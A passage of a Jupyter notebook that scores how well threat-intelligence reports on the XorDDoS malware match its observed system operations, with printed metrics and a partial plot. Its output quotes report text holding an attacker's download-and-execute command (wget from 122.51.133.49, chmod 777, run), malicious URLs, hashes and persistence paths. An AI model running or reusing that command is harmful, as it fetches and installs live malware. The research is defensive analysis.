    "        print(f\"\\tnum of segment in report: {len(rem.sentences)}\")\n",
    "        print(f\"\\tlenght of ctd's OPset is {len(rem.doc_OPset)}\")\n",
    "\n",
    "        # R_malObj 比較物件\n",
    "        asg_object = set([op.object for op in sample.OPset])\n",
    "        ctd_object = set([op.object for op in rem.doc_OPset])\n",
    "        ctd_object = ctd_object.intersection(asg_object)\n",
    "        numerator = len(ctd_object) # 分子\n",
    "        denominator = len(asg_object) # 分母\n",
    "        R_malObj = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malObj\\n\\tnum of ctd objects: {numerator}, num of asg objects: {denominator}. R_malObj is {R_malObj:.4f}\")\n",
    "        print(f\"\\t\\tctd_object: {ctd_object}\")\n",
    "\n",
    "        # R_malSysObj 比較系統物件\n",
    "        asg_sysobj = list(filter(lambda object: object.find('/etc') != -1, asg_object))\n",
    "        ctd_sysobj = list(filter(lambda object: object.find('/etc') != -1, ctd_object))\n",
    "        numerator = len(ctd_sysobj)\n",
    "        denominator = len(asg_sysobj)\n",
    "        R_malSysObj = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malSysObj\\n\\tnum of ctd objects: {numerator}, num of asg objects: {denominator}. R_malSysObj is {R_malSysObj:.4f}\")\n",
    "\n",
    "        # R_malOps 比較動作和物件\n",
    "        asg_OPset = list(sample.OPset)\n",
    "        ctd_OPset = list(rem.doc_OPset)\n",
    "        operationEvaluator = OperationEvaluator()\n",
    "        numerator, denominator, hits = 0, len(asg_OPset), []\n",
    "        hits: list[tuple[OperationPair, OperationPair]] = []\n",
    "        sys_hits: list[tuple[OperationPair, OperationPair]] = []\n",
    "        print(f\"\\t\\tlen(asg_OPset): {len(asg_OPset)}, len(ctd_OPset): {len(ctd_OPset)}\")\n",
    "        # 每一個 asg_op 跟所有同物件的的 ctd_op 進行 resolve() 比對，來判斷此 asg_op 是否被提及\n",
    "        i = 0\n",
    "        for idx_asg, asg_op in enumerate(asg_OPset): \n",
    "            i += 1\n",
    "            # print(f\"\\tno.{i} asg_op {asg_op}\") # 瓶頸卡在 no.51 step (total 71 step)\n",
    "            target_obj = asg_op.object\n",
    "            ctdSameObjOpsIdx = [i for i, x in enumerate(ctd_OPset) if x.object == target_obj]\n",
    "            # if i==51:\n",
    "            # print(f\"\\tno.{i} | asg_op {asg_op}, len of ctdSameObjOpsIdx: {ctdSameObjOpsIdx}\")\n",
    "            # ctdSameObjOps = [x for x in ctd_OPset if x.object == target_obj]\n",
    "            for idx in ctdSameObjOpsIdx:\n",
    "                pass\n",
    "                # mem_before_create_lst = get_mem_usage()\n",
    "                # print(\"\\tbefore resolve\", mem_before_create_lst)\n",
    "                hit = operationEvaluator.resolve(asg_op.action, ctd_OPset[idx].action)\n",
    "                # # print_mem_usage()\n",
    "                # mem_after_create_lst = get_mem_usage()\n",
    "                # # print(f\"\\t=== diff of mem_usage calling resolve(): {mem_after_create_lst - mem_before_create_lst:.2f}  ===\")\n",
    "        \n",
    "                if hit:\n",
    "                    numerator += 1\n",
    "                    (opModeAsg, opModeCtd) = hit # hit is [OperationMode]*2\n",
    "                    hits.append((asg_OPset[idx_asg], ctd_OPset[idx]))\n",
    "                    fset.rem_lst[idx_rem].match_doc_OPset.add(ctd_OPset[idx])\n",
    "\n",
    "                    # 篩選出系統物件的動作\n",
    "                    if (opModeAsg in [OperationMode.FILE_UPDATE]) and asg_OPset[idx_asg].object.find('/etc') != -1:\n",
    "                        sys_hits.append((asg_OPset[idx_asg], ctd_OPset[idx]))\n",
    "\n",
    "                    # 紀錄CTD的生命週期 (ASG_OP提及順序)\n",
    "                    step_num = sample.OPset_ordered.index(asg_op) # index of step, throw ValueError if not found\n",
    "                    fset.rem_lst[idx_rem].OPset_order_index.append(step_num)\n",
    "                    break\n",
    "        R_malOps = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malOps\\n\\tnum of matched asg op: {numerator}, num of asg op: {denominator}. R_malOps is {R_malOps:.4f}\")\n",
    "        print(f\"\\t\\trefered lifecycle: {fset.rem_lst[idx_rem].OPset_order_index}\")\n",
    "\n",
    "        # 紀錄CTD的生命週期 (OP提及順序)\n",
    "        # fset.rem_lst[idx_rem].OPset_order_index.clear()\n",
    "        # for ctd_op in fset.rem_lst[idx_rem].match_doc_OPset:\n",
    "        #     step_num = sample.OPset_ordered.index(ctd_op) # index of step, throw ValueError if not found\n",
    "        #     fset.rem_lst[idx_rem].OPset_order_index.append(step_num)\n",
    "\n",
    "        # R_malChangeOps 篩選出系統物件的動作\n",
    "        # cando: 加上 OPMode的考量，為class OP加兩個mode asg_op_mode, ctd_op_mode。目前直接用call nlp class 的 method判別。\n",
    "        numerator = len(sys_hits)\n",
    "        sys_asg_OPset = [op for op in asg_OPset if op.object.find('/etc') != -1 \\\n",
    "                         and operationEvaluator.get_mode(op.action) == OperationMode.FILE_UPDATE ]\n",
    "        # print('sys_asg_OPset is unique:', len(sample.OPset_ordered) == len(set(sample.OPset_ordered))) # 元速度重複沒錯，可能是 index() 的問題\n",
    "        print(f\"\\t\\tsys_asg_OPset: {sys_asg_OPset}\")\n",
    "        denominator = len(sys_asg_OPset)\n",
    "        R_malChangeOps = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malChangeOps\\n\\tnum of matched asg op: {numerator}, num of asg op: {denominator}. R_malChangeOps is {R_malChangeOps:.4f}\")\n",
    "\n",
    "        # 紀錄CTD的生命週期 (OP提及順序)\n",
    "        fset.rem_lst[idx_rem].SysOPset_order_index.clear()\n",
    "        for asg_op , ctd_op in sys_hits:\n",
    "            step_num = sample.OPset_ordered.index(asg_op) # step index , throw ValueError if not found\n",
    "            fset.rem_lst[idx_rem].SysOPset_order_index.append(step_num)\n",
    "        print(f\"\\t\\tref-sys lifecycle: {fset.rem_lst[idx_rem].SysOPset_order_index}\")\n",
    "\n",
    "        if hits:\n",
    "            print(\"\\n\\thits\")\n",
    "            for asg_op, ctd_op in hits:\n",
    "                print(f\"\\t{asg_op}, {ctd_op.getSentStr()}\")\n",
    "        if sys_hits:\n",
    "            print(\"\\n\\tsys_hits\")\n",
    "            for asg_op, ctd_op in sys_hits:\n",
    "                print(f\"\\t{asg_op}, {ctd_op.getSentStr()}\")\n",
    "\n",
    "        # print_mem_usage()\n",
    "        # del asg_OPset, ctd_OPset, hits, sys_hits\n",
    "    print(\"\\n\\nOperationPair that changes system resources:\\n\", sys_asg_OPset)\n",
    "\n",
    "    return fset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "def save_match_sent_to_excel(fset: FamilySet, sample_name=None):\n",
    "    columns = ['report','regex','matched word','sentence number','sentence']\n",
    "    if sample_name:\n",
    "        output_xlsx = f'{outputfolder}/{family}_{sample_name[:3]}_report_match_sent.csv'\n",
    "    else:\n",
    "        output_xlsx = f'{outputfolder}/{family}_union_report_match_sent.csv'\n",
    "    has_match = sum([len(rem.get_match_regexs()) for rem in fset.rem_lst])\n",
    "    if has_match == 0:\n",
    "        print('no matches in CTI reports') # with open 一定要寫入，若全空則直接不開檔\n",
    "        return\n",
    "    # with pd.ExcelWriter(output_xlsx, engine='openpyxl') as writer:\n",
    "    \n",
    "    # 遍歷報告，一個 rem: ReportEvalModel 代表一篇報告\n",
    "    csv_data = []\n",
    "    match_sentence_ttlcnt = 0\n",
    "    for rem in fset.rem_lst:\n",
    "        reportname = rem.reportname.split('.')[0]\n",
    "        if len(rem.get_match_regexs()) == 0: # 如果報告中無 regex 跳過不紀錄\n",
    "            continue\n",
    "        # sheet_data = [] # shape = columns_len * match_sent_len\n",
    "        sent_df = rem.get_match_sentences()\n",
    "        sent_content_lst = rem.sentences['Content'] # 報告中的每個句子\n",
    "        match_sentence_ttlcnt += sent_df['match'].sum()\n",
    "\n",
    "        # 遍歷每個含有 regex 的句子\n",
    "        for sid, row in sent_df.iterrows():\n",
    "            if row['match'] == 0:\n",
    "                continue\n",
    "            row.drop('match', inplace=True)\n",
    "            row = row[row > 0]\n",
    "            # print(row)\n",
    "            # 考量每個句子可能含有多個 regex，故需寫成多行\n",
    "            for i, v in row.items():\n",
    "                insert_data = dict().fromkeys(columns)\n",
    "                insert_data['report'] = reportname\n",
    "                insert_data['regex'] = i\n",
    "                insert_data['matched word'] = rem.get_match_word(sid, i)\n",
    "                insert_data['sentence number'] = sid + 1\n",
    "                insert_data['sentence'] = str(sent_content_lst[sid]).strip()\n",
    "                # sheet_data.append(insert_data)\n",
    "                csv_data.append(insert_data)\n",
    "    df = pd.DataFrame(csv_data)\n",
    "    # print(df)\n",
    "    df.to_csv(output_xlsx, index=False)\n",
    "\n",
    "            # 輸出 csv\n",
    "            \n",
    "            # 輸出 excel sheet\n",
    "            # print(rem.reportname,'has', len(sheet_data),'matches')\n",
    "            # output_sheet = pd.DataFrame(sheet_data)\n",
    "            # # output_sheet.style.set_properties(subset=['sentence'])\n",
    "            # styler = Styler(horizontal_alignment='left', vertical_alignment='top')\n",
    "            # sf = StyleFrame(output_sheet, styler)\n",
    "            # sf = sf.set_column_width(columns=['baseline'], width=20.0)\n",
    "            # sf = sf.set_column_width(columns=['sentence number'], width=15.0)\n",
    "            # sf = sf.set_column_width(columns=['sentence'], width=80.0)\n",
    "            # sf.to_excel(writer, sheet_name=rem.reportname, index=False) #.save()\n",
    "            # # output_sheet.to_excel(writer, sheet_name=rem.reportname, index=False)\n",
    "    return match_sentence_ttlcnt\n",
    "\n",
    "# 此行會執行並複寫 excel，執行完後要手動調整行距格式，小心使用\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== mem_usage: 211.41 MB ===\n",
      "asg_object: {'permission(\\\\s|:)[0-9]{1,4}', '/var/run/', '^pipe(\\\\$|\\\\.|$)', '/etc/sed', '/etc/cron', '/etc/rc', 'bin/sed', '^sed$', '^sh$', '/var/', '/etc/init.d/', '/boot/', '^chkconfig$', '/proc/', 'bin/openrc', '/selinux', '/boot/[a-z]{10}', '^systemctl$', 'bin/insserv', '/run/', '[a-zA-z]:\\\\d{1,5}$', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}:\\\\d{1,5}$', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}', '/proc/rs_dev', 'update-rc.d', '/perl/'}\n",
      "\n",
      "\n",
      "Sample Xorddos-Cdnetworks.csv\n",
      "\tnum of segment in report: 32\n",
      "\tlenght of ctd's OPset is 0\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000\n",
      "\t\tctd_object: set()\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 0\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000\n",
      "\t\trefered lifecycle: []\n",
      "\t\tsys_asg_OPset: [<OP32 act=lstat, obj=/etc/rc>, <OP15 act=write, obj=/etc/init.d/>, <OP47 act=fchmod, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "Sample Xorddos-Crowdstrike.csv\n",
      "\tnum of segment in report: 45\n",
      "\tlenght of ctd's OPset is 0\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000\n",
      "\t\tctd_object: set()\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 0\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000\n",
      "\t\trefered lifecycle: []\n",
      "\t\tsys_asg_OPset: [<OP32 act=lstat, obj=/etc/rc>, <OP15 act=write, obj=/etc/init.d/>, <OP47 act=fchmod, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "Sample Xorddos-Intezer.csv\n",
      "\tnum of segment in report: 156\n",
      "\tlenght of ctd's OPset is 7\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 4, num of asg objects: 26. R_malObj is 0.1538\n",
      "\t\tctd_object: {'\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}', '/etc/rc', '/etc/init.d/', '/proc/'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 7\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 3, num of asg op: 73. R_malOps is 0.0411\n",
      "\t\trefered lifecycle: [67, 0, 68]\n",
      "\t\tsys_asg_OPset: [<OP32 act=lstat, obj=/etc/rc>, <OP15 act=write, obj=/etc/init.d/>, <OP47 act=fchmod, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP68 act=access, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\t<OP 1 act=readlink, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\t<OP69 act=newfstatat, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\n",
      "Sample Xorddos-Trendmicro.csv\n",
      "\tnum of segment in report: 27\n",
      "\tlenght of ctd's OPset is 6\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 6, num of asg objects: 26. R_malObj is 0.2308\n",
      "\t\tctd_object: {'/etc/cron', '/etc/rc', '/var/run/', '/run/', '[a-zA-z]:\\\\d{1,5}$', '/var/'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 6\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 9, num of asg op: 73. R_malOps is 0.1233\n",
      "\t\trefered lifecycle: [56, 49, 69, 55, 32, 48, 57, 15, 2]\n",
      "\t\tsys_asg_OPset: [<OP32 act=lstat, obj=/etc/rc>, <OP15 act=write, obj=/etc/init.d/>, <OP47 act=fchmod, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP57 act=lseek, obj=/var/run/>, <OP 4 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP50 act=stat64, obj=/var/run/>, <OP 4 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP70 act=newfstatat, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP56 act=lseek, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP33 act=stat, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP49 act=stat64, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP58 act=lseek, obj=/var/>, <OP 5 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP16 act=open, obj=/etc/cron>, <OP 1 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= this backdoor drops the following files:  /etc/cron.hourly/gcc.sh (cron is a time-based job scheduler in unix-like computer operating systems) backdoor routine>\n",
      "\t<OP 3 act=stat64, obj=/var/>, <OP 5 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\n",
      "Sample Xorddos-Trendmicro2.csv\n",
      "\tnum of segment in report: 47\n",
      "\tlenght of ctd's OPset is 2\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 1, num of asg objects: 26. R_malObj is 0.0385\n",
      "\t\tctd_object: {'\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 2\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 2, num of asg op: 73. R_malOps is 0.0274\n",
      "\t\trefered lifecycle: [61, 63]\n",
      "\t\tsys_asg_OPset: [<OP32 act=lstat, obj=/etc/rc>, <OP15 act=write, obj=/etc/init.d/>, <OP47 act=fchmod, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP62 act=send, obj=ip_addr>, <OP 1 act=wget, obj=http://122.51.133.49:10086/vip, sent=afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:  wget http://122.51.133.49:10086/vip –o vip chmod 777 vip ./vip the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server.>\n",
      "\t<OP64 act=_newselect, obj=ip_addr>, <OP 2 act=find, obj=http://62.171.160.189/linux_arm, sent= indicators of compromise kaiji  file name\tsha 256\ttrend micro pattern detection 123.sh\t9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8\ttrojan.sh.kaiji.a linux_arm\td315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56\tddos.linux.kaiji.a related urls:  http://62.171.160.189/linux_arm http://62.171.160.189/11/123.sh xorddos and other malware variants found through the same url  sha 256\ttrend micro pattern detection dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3\tbackdoor.linux.xorddos.ae 6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c\tbackdoor.linux.dofloo.ab 286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe\tbackdoor.win32.sddos.a related url:  http://122.51.133.49:10086/vip>\n",
      "\n",
      "\n",
      "OperationPair that changes system resources:\n",
      " [<OP32 act=lstat, obj=/etc/rc>, <OP15 act=write, obj=/etc/init.d/>, <OP47 act=fchmod, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>]\n"
     ]
    }
   ],
   "source": [
    "for sample in samples:\n",
    "    # print(len(sample.OPset)) # 30\n",
    "    # print(len(sample.OPset_ordered)) # 30\n",
    "    # print(set(sample.OPset) - set(sample.OPset_ordered)) # 相減是空的set 都OK\n",
    "    fset = run_family_set_procedure(sample)\n",
    "    # match_sentence_ttlcnt = save_match_sent_to_excel(fset, sample.samplename)\n",
    "    # print(f'match_sentence_ttlcnt is {match_sentence_ttlcnt}\\n---\\n')"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: draw Lifecycle diagram\n",
    "- 兩個 traces (legend) 一般的 OP 和 ChangeSys OP。分兩個顏色，不重疊。\n",
    "- x: [a,a,a,a,b,b,b,c,c,c] 不同 report 的 step 可以放同一個 list，因為屬於同個 trace。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "c:\\Users\\luweb\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\plotly\\io\\_renderers.py:7: DeprecationWarning:\n",
      "\n",
      "The distutils package is deprecated and slated for removal in Python 3.12. Use setuptools or check PEP 632 for potential alternatives\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.plotly.v1+json": {
       "config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "data": [
        {
         "marker": {
          "color": "darkorange",
          "size": 12
         },
         "mode": "markers",
         "name": "Normal Operation Pair",
         "type": "scatter",
         "x": [
          68,
          1,
          69,
          57,
          50,
          70,
          56,
          33,
          49,
          58,
          16,
          3,
          62,
          64,
          1,
          2,
          3,
          4,
          5,
          6,
          7,
          8,
          9,
          10,
          11,
          12,
          19,
          20,
          23,
          24,
          25,
          26,
          27,
          28,
          29,
          30,
          31,
          33,
          34,
          35,
          36,
          37,
          38,
          39,
          40,
          41,
          42,
          49,
          50,
          51,
          52,
          53,
          54,
          55,
          56,
          57,
          58,
          59,
          60,
          61,
          62,
          63,
          64,
          65,
          66,
          67,
          68,
          69,
          70,
          71,
          72,
          73
         ],
         "y": [
          "Intezer (3)",
          "Intezer (3)",
          "Intezer (3)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro2 (2)",
          "Trendmicro2 (2)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)"
         ]
        },
        {
         "marker": {
          "color": "blue",
          "size": 12
         },
         "mode": "markers",
         "name": "Change SR Operation Pair",
         "type": "scatter",
         "x": [
          21,
          32,
          15,
          47,
          14,
          13,
          45,
          43,
          44,
          18,
          22,
          17,
          16,
          46,
          48
         ],
         "y": [
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)"
         ]
        }
       ],
       "layout": {
        "template": {
         "data": {
          "bar": [
           {
            "error_x": {
             "color": "#2a3f5f"
            },
            "error_y": {
             "color": "#2a3f5f"
            },
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "bar"
           }
          ],
          "barpolar": [
           {
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "barpolar"
           }
          ],
          "carpet": [
           {
            "aaxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "baxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "type": "carpet"
           }
          ],
          "choropleth": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "choropleth"
           }
          ],
          "contour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
